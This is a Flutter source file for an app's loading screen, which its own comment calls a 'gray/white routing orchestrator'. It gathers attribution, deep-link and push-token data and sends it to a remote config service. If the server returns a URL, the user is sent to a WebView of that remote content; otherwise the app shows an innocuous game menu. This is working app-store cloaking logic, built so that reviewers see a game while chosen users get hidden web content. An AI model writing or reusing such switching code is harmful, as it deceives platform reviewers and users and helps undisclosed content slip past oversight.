import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:video_player/video_player.dart';
import '../../screens/main_menu_screen.dart';
import '../models/app_mode.dart';
import '../services/attribution_agent.dart';
import '../services/config_fetcher.dart';
import '../services/net_probe.dart';
import '../services/push_agent.dart';
import '../services/vault.dart';
import 'browser_screen.dart' deferred as browser;
import 'offline_screen.dart';
import 'push_promo_screen.dart';

enum _BarState { empty, midway, full }

/// Gate/loading screen — gray/white routing orchestrator.
/// Shows the loading video while running attribution + config pipeline,
/// then routes to either BrowserScreen (gray WebView) or MainMenuScreen (game).
class GateScreen extends StatefulWidget {
  final Vault vault;
  final NetProbe probe;
  final AttributionAgent agent;
  final ConfigFetcher fetcher;
  final PushAgent pushAgent;

  const GateScreen({
    super.key,
    required this.vault,
    required this.probe,
    required this.agent,
    required this.fetcher,
    required this.pushAgent,
  });

  @override
  State<GateScreen> createState() => _GateScreenState();
}

class _GateScreenState extends State<GateScreen> {
  VideoPlayerController? _video;
  bool _videoReady = false;
  _BarState _bar = _BarState.empty;
  bool _navigated = false;
  Orientation? _orientation;

  @override
  void initState() {
    super.initState();
    SystemChrome.setPreferredOrientations([
      DeviceOrientation.portraitUp,
      DeviceOrientation.portraitDown,
      DeviceOrientation.landscapeLeft,
      DeviceOrientation.landscapeRight,
    ]);
    _run();
  }

  @override
  void didChangeDependencies() {
    super.didChangeDependencies();
    final o = MediaQuery.of(context).orientation;
    if (o != _orientation) {
      _orientation = o;
      _switchVideo(o);
    }
  }

  Future<void> _switchVideo(Orientation o) async {
    final asset = o == Orientation.landscape
        ? 'assets/additional_assets/loading_screen/16x9_loading_screen.mp4'
        : 'assets/additional_assets/loading_screen/9x16_Loading_Screen.mp4';
    final old = _video;
    final ctrl = VideoPlayerController.asset(asset);
    try {
      await ctrl.initialize();
      ctrl.setLooping(true);
      ctrl.setVolume(0);
      ctrl.play();
      if (!mounted) { ctrl.dispose(); return; }
      setState(() { _video = ctrl; _videoReady = true; });
      old?.dispose();
    } catch (_) { ctrl.dispose(); }
  }

  void _setBar(_BarState b) {
    if (mounted) setState(() => _bar = b);
  }

  Future<void> _run() async {
    widget.pushAgent.onTokenRefresh = _onTokenRefresh;
    await widget.pushAgent.init().catchError((_) {});
    _setBar(_BarState.empty);

    final mode = widget.vault.getAppMode();
    switch (mode) {
      case AppMode.online:
        _setBar(_BarState.midway);
        await _handleOnlineMode();
        break;
      case AppMode.offline:
        _setBar(_BarState.midway);
        await Future.delayed(const Duration(milliseconds: 600));
        _setBar(_BarState.full);
        await Future.delayed(const Duration(milliseconds: 400));
        _goGame();
        break;
      case AppMode.pending:
        await _handleFirstLaunch();
        break;
    }
  }

  @override
  void dispose() {
    widget.pushAgent.onTokenRefresh = null;
    _video?.dispose();
    super.dispose();
  }

  void _onTokenRefresh(String token) async {
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.agent.buildPayload(locale: locale, pushToken: token);
    widget.fetcher.fetchRemote(body);
  }

  Future<void> _handleFirstLaunch() async {
    _setBar(_BarState.empty);
    final online = await widget.probe.hasInternet();
    if (!online) {
      if (mounted) _goOffline();
      return;
    }
    _setBar(_BarState.midway);
    await widget.agent.init();
    await Future.wait([
      widget.agent.waitForAttribution(),
      widget.agent.waitForDeepLink(),
    ]);
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.agent.buildPayload(
      locale: locale, pushToken: widget.pushAgent.token,
    );
    final reply = await widget.fetcher.fetchRemote(body);
    if (reply.ok && reply.url != null) {
      await widget.vault.setAppMode(AppMode.online);
      _setBar(_BarState.full);
      await Future.delayed(const Duration(milliseconds: 400));
      if (mounted) _goContent(reply.url!);
    } else {
      await widget.vault.setAppMode(AppMode.offline);
      _setBar(_BarState.full);
      await Future.delayed(const Duration(milliseconds: 400));
      if (mounted) _goGame();
    }
  }

  Future<void> _handleOnlineMode() async {
    final online = await widget.probe.hasInternet();
    if (!online) {
      _setBar(_BarState.full);
      await Future.delayed(const Duration(milliseconds: 400));
      if (mounted) _goOffline();
      return;
    }
    final pushUrl = await widget.vault.consumePushUrl();
    if (pushUrl != null) {
      _setBar(_BarState.full);
      await Future.delayed(const Duration(milliseconds: 400));
      if (mounted) _goContent(pushUrl);
      return;
    }
    final savedUrl = await widget.vault.getSavedUrl();
    await widget.agent.init();
    await Future.wait([
      widget.agent.waitForAttribution(timeout: const Duration(seconds: 10)),
      widget.agent.waitForDeepLink(),
    ]);
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.agent.buildPayload(
      locale: locale, pushToken: widget.pushAgent.token,
    );
    final reply = await widget.fetcher.fetchRemote(body);
    _setBar(_BarState.full);
    await Future.delayed(const Duration(milliseconds: 400));
    if (!mounted) return;
    if (reply.ok && reply.url != null) {
      _goContent(reply.url!);
    } else if (savedUrl != null) {
      _goContent(savedUrl);
    } else {
      _goOffline();
    }
  }

  Future<void> _goContent(String url) async {
    if (_navigated) return;
    _navigated = true;
    await browser.loadLibrary();
    await browser.prepareWebEngine();
    if (!mounted) return;
    if (widget.vault.shouldShowNfScreen()) {
      Navigator.of(context).pushReplacement(MaterialPageRoute(
        builder: (_) => PushPromoScreen(
          vault: widget.vault,
          pushAgent: widget.pushAgent,
          probe: widget.probe,
          contentUrl: url,
        ),
      ));
    } else {
      Navigator.of(context).pushReplacement(MaterialPageRoute(
        builder: (_) => browser.BrowserScreen(
          url: url,
          vault: widget.vault,
          pushAgent: widget.pushAgent,
          probe: widget.probe,
        ),
      ));
    }
  }

  void _goGame() {
    if (_navigated) return;
    _navigated = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(builder: (_) => const MainMenuScreen()),
    );
  }

  void _goOffline() {
    if (_navigated) return;
    _navigated = true;
    Navigator.of(context).pushReplacement(MaterialPageRoute(
      builder: (_) => OfflineScreen(
        retryBuilder: (_) => GateScreen(
          vault: widget.vault,
          probe: widget.probe,
          agent: widget.agent,
          fetcher: widget.fetcher,
          pushAgent: widget.pushAgent,
        ),
      ),
    ));
  }

  String _barAsset() {
    switch (_bar) {
      case _BarState.empty:  return 'assets/additional_assets/loading_screen/loading_bar_01.webp';
      case _BarState.midway: return 'assets/additional_assets/loading_screen/loading_bar_02.webp';
      case _BarState.full:   return 'assets/additional_assets/loading_screen/loading_bar_04.webp';
    }
  }

  @override
  Widget build(BuildContext context) {
    final barAsset = _barAsset();
    final mq = MediaQuery.of(context);
    final landscape = mq.orientation == Orientation.landscape;
    final barW = landscape
        ? (mq.size.height * 0.35).clamp(0.0, 160.0)
        : (mq.size.width * 0.70).clamp(0.0, 340.0);

    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        fit: StackFit.expand,
        children: [
          const ColoredBox(color: Colors.black),
          AnimatedOpacity(
            opacity: _videoReady ? 1.0 : 0.0,
            duration: const Duration(milliseconds: 400),
            child: _video != null && _videoReady
                ? SizedBox.expand(
                    child: FittedBox(
                      fit: BoxFit.cover,
                      child: SizedBox(
                        width: _video!.value.size.width,
                        height: _video!.value.size.height,
                        child: VideoPlayer(_video!),
                      ),
                    ),
                  )
                : const SizedBox.shrink(),
          ),
          if (_videoReady)
            Positioned(
              left: 0, right: 0,
              bottom: landscape ? 0 : mq.padding.bottom,
              child: Center(
                child: AnimatedSwitcher(
                  duration: const Duration(milliseconds: 300),
                  child: Image.asset(
                    barAsset,
                    key: ValueKey(barAsset),
                    width: barW,
                    fit: BoxFit.contain,
                    gaplessPlayback: true,
                    errorBuilder: (context, error, stack) => const SizedBox(height: 32),
                  ),
                ),
              ),
            ),
        ],
      ),
    );
  }
}
